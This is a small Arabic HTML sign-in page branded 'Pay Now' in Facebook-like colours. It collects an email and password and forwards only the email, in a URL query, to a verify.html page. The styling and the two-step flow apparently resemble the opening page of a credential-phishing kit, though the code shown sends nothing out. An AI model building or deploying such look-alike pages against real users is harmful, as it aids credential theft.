<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Pay Now</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f2f5; }
        .container { margin-top: 50px; background: white; padding: 20px; width: 300px; margin: auto; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        .btn { background: #1877f2; color: white; padding: 10px; border: none; width: 100%; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <h2>تسجيل الدخول</h2>
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button class="btn" onclick="redirectToVerify()">التالي</button>
    </div>

    <script>
        function redirectToVerify() {
            const email = document.getElementById("email").value;
            if (email) {
                window.location.href = `verify.html?email=${encodeURIComponent(email)}`;
            } else {
                alert("الرجاء إدخال البريد الإلكتروني.");
            }
        }
    </script>

</body>
</html>
